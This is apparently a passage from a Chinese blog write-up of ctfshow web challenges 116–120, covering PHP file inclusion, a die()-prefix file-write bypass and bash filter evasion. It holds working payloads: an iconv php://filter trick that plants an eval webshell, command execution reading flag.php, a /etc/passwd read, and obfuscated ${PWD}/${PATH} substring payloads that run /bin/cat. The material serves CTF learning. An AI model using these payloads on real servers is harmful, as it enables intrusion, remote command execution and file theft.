<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">27657186      0x1A603E2       PGP RSA encrypted session key - keyid: 7DEBB57A 854F782F RSA (Encrypt or Sign) 1024b</span><br><span class="line">27820636      0x1A8825C       MySQL ISAM index file Version 8</span><br><span class="line">28976826      0x1BA26BA       HPACK archive data</span><br><span class="line">40994603      0x271872B       PNG image, 941 x 320, 8-bit/color RGBA, non-interlaced</span><br><span class="line">40994644      0x2718754       Zlib compressed data, default compression</span><br></pre></td></tr></table></figure>
<p>但是binwalk分离不出来，就用foremost分离，分离出一张图片，图片上是代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)(<span class="params"><span class="keyword">if</span>(<span class="params">preg_match(<span class="params"><span class="string">&#x27;/http https data input rot13 base64 string log sess/i&#x27;</span>,<span class="variable">$x</span></span>)</span>)[<span class="keyword">die</span>(<span class="params"><span class="string">&#x27;too young too simple sometimes native!&#x27;</span></span>);</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="variable">$file</span>=<span class="keyword">isset</span>(<span class="params">$ GET[<span class="string">&#x27;file&#x27;</span>]</span>)?<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="string">&quot;sp2.mp4&quot;</span>;</span></span></span><br><span class="line"><span class="params"><span class="function">	header(<span class="params"><span class="string">&#x27;Content-Type: video/mp4&#x27;</span></span>) ;</span></span></span><br><span class="line"><span class="params"><span class="function">	filter(<span class="params"><span class="variable">$file</span></span>);</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">echo</span> file _get_contents(<span class="params"><span class="variable">$file</span></span>);</span></span></span><br></pre></td></tr></table></figure>
<p>就很明显是文件包含</p>
<p>尝试包含一个?file&#x3D;flag.php，然后看不到任何东西，直接看network那里也没东西，看了wp，用burp抓包才抓到。当然，?file&#x3D;&#x2F;etc&#x2F;passwd也是可以的。</p>
<h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
<p>文件写入，经典绕过die()。<a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/116170568">死亡绕过1</a> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">死亡绕过2</a></p>
<p>这道题，过滤了太多（base64、rot13、zlib等等），但是没有过滤iconv。所以可以使用iconv试一下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_GET[cmd]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// ?&lt;hp pe@av(l_$EG[Tmc]d;)&gt;?</span></span><br></pre></td></tr></table></figure>
<p>我才知道，<code>$_GET[]</code>里面是可以不用加单引号的，PHP的灵活性还是太高了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php </span><br><span class="line">POST</span><br><span class="line">contents=?&lt;hp pe@av(l_$EG[Tc&#x27;dm]&#x27;;)&gt;?</span><br></pre></td></tr></table></figure>
<p>直接访问马就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.php?cmd=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p>打开后是一个输入框，无论怎么弄都是evil input。从<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/121721209">wp</a>处学到了一手可以通过Burpsuite来FUZZ。<br>通过把<code>QWERTYUIOsadfghjjk&#123;&#125;:&quot;</code>这种内容弄一个字典然后挨个用Burpsuite爆破，发现所有的大写字母，以及<code>@$_~#;.&#123;&#125;:?</code>没有被waf。根据f12源代码里的<code>system($code);</code>，大致是需要让我们构造<code>$code</code>吧。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/121721209">wp</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># echo $&#123;PWD&#125; </span><br><span class="line">/root</span><br><span class="line"></span><br><span class="line"># echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符</span><br><span class="line">/           </span><br><span class="line"></span><br><span class="line"># echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符</span><br><span class="line">t</span><br><span class="line"></span><br><span class="line"># echo $&#123;PWD:~0&#125;      </span><br><span class="line">t</span><br><span class="line"></span><br><span class="line"># echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             </span><br><span class="line">t</span><br><span class="line"></span><br><span class="line"># echo $&#123;PATH&#125;                            </span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>


<p>总结了几个构造的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.??? </span><br><span class="line">// $&#123;PATH:~A&#125;就是取path的最后一个字符，对于/bin结尾的PATH，最后一个字符就是n。</span><br><span class="line">// $&#123;PWD:~A&#125;就是取PWD的最后一个字符。对于/var/www/html来说，最后一个字符就是l。</span><br><span class="line">// 所以，$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;就是nl。</span><br><span class="line">// $IFS是类似空格的分隔符,后面的????.???是通配符，可能是尝试读flag.php。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br><span class="line">// $&#123;PATH:~A&#125;是n。</span><br><span class="line">// $&#123;#TERM&#125;是一个shell变量，它表示TERM变量的长度。</span><br><span class="line">// $&#123;TERM&#125;是一个环境变量，它定义了当前终端的类型。比如，kali的$&#123;TERM&#125;就是xterm-256color。</span><br><span class="line">// SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$&#123;SHLVL&#125;=2。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">// 使用random来构造</span><br></pre></td></tr></table></figure>

<p>其他知识点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#IFS&#125;=3。（linux下是3，mac里是4）</span><br></pre></td></tr></table></figure>

<h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p><a target="_blank" rel="noopener" href="https://ctf.show/writeups/1144296">wp</a>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">默认的pwd是</span><br><span class="line">/var/www/html</span><br><span class="line">于是结合hips构造出自己的答案：</span><br><span class="line">/bin/cat flag.php</span><br><span class="line"></span><br><span class="line">/???/?at ?l??.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125; = &#123;$&#123;PWD&#125;:0:1&#125; = / (从第零个字符开始，截取一个字符)</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125; = $&#123;PWD:2:1&#125; = a (从第二个字符开始，截取一个字符)</span><br><span class="line"></span><br><span class="line">$&#123;PWD:~$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125; = $&#123;PWD:-2:1&#125; = t (从倒数第二个字符开始，截取一个字符)</span><br><span class="line"></span><br><span class="line">$&#123;PWD:~A&#125; = 取最后一位 = l </span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;##&#125;&#125;?$&#123;PWD:$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PWD:~$&#123;SHLVL&#125;:$&#123;#SHLVL&#125;&#125;$IFS?$&#123;PWD:~A&#125;??.???</span><br></pre></td></tr></table></figure>

<h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125; 就是 $&#123;PWD:0:$&#123;#SHLVL&#125;&#125;， 对/var/www/html来说，就是/。</span><br></pre></td></tr></table></figure>
<p>那么跟上道题一样，构造<code>/bin/cat flag.php</code>即可，但是存在着字符串长度限制。官方的payload是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure>
<p>我们怎么知道USER是以a结尾的？所以这个payload不可行，除非知道了USER是以a结尾的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?$&#123;PWD:$&#123;SHLVL&#125;:$&#123;##&#125;&#125;? ????.???</span><br></pre></td></tr></table></figure>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/friends/">friends</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7%E7%AF%87-web89-web120"><span class="toc-number">1.</span> <span class="toc-text">PHP特性篇 web89-web120</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web89"><span class="toc-number">1.1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web90"><span class="toc-number">1.2.</span> <span class="toc-text">web90</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web91"><span class="toc-number">1.3.</span> <span class="toc-text">web91</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web92"><span class="toc-number">1.4.</span> <span class="toc-text">web92</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web93"><span class="toc-number">1.5.</span> <span class="toc-text">web93</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web94"><span class="toc-number">1.6.</span> <span class="toc-text">web94</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web95"><span class="toc-number">1.7.</span> <span class="toc-text">web95</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web96"><span class="toc-number">1.8.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web97"><span class="toc-number">1.9.</span> <span class="toc-text">web97</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web98"><span class="toc-number">1.10.</span> <span class="toc-text">web98</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web99"><span class="toc-number">1.11.</span> <span class="toc-text">web99</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web100"><span class="toc-number">1.12.</span> <span class="toc-text">web100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web101"><span class="toc-number">1.13.</span> <span class="toc-text">web101</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web102"><span class="toc-number">1.14.</span> <span class="toc-text">web102</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web103"><span class="toc-number">1.15.</span> <span class="toc-text">web103</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web104"><span class="toc-number">1.16.</span> <span class="toc-text">web104</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web105"><span class="toc-number">1.17.</span> <span class="toc-text">web105</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web106"><span class="toc-number">1.18.</span> <span class="toc-text">web106</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web107"><span class="toc-number">1.19.</span> <span class="toc-text">web107</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web108"><span class="toc-number">1.20.</span> <span class="toc-text">web108</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web109"><span class="toc-number">2.</span> <span class="toc-text">web109</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web110"><span class="toc-number">3.</span> <span class="toc-text">web110</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web111"><span class="toc-number">3.1.</span> <span class="toc-text">web111</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web112"><span class="toc-number">3.2.</span> <span class="toc-text">web112</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web113"><span class="toc-number">3.3.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web114"><span class="toc-number">3.4.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web115"><span class="toc-number">3.5.</span> <span class="toc-text">web115</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web116"><span class="toc-number">3.6.</span> <span class="toc-text">web116</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web117"><span class="toc-number">3.7.</span> <span class="toc-text">web117</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web118"><span class="toc-number">3.8.</span> <span class="toc-text">web118</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web119"><span class="toc-number">3.9.</span> <span class="toc-text">web119</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web120"><span class="toc-number">3.10.</span> <span class="toc-text">web120</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&text=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&is_video=false&description=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-PHP特性-前半部分&body=Check out this article: http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&title=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&name=ctfshow-web入门笔记-PHP特性-前半部分&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/02/13/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-PHP%E7%89%B9%E6%80%A7-%E5%89%8D%E5%8D%8A%E9%83%A8%E5%88%86/&t=ctfshow-web入门笔记-PHP特性-前半部分"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    ShuiChang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
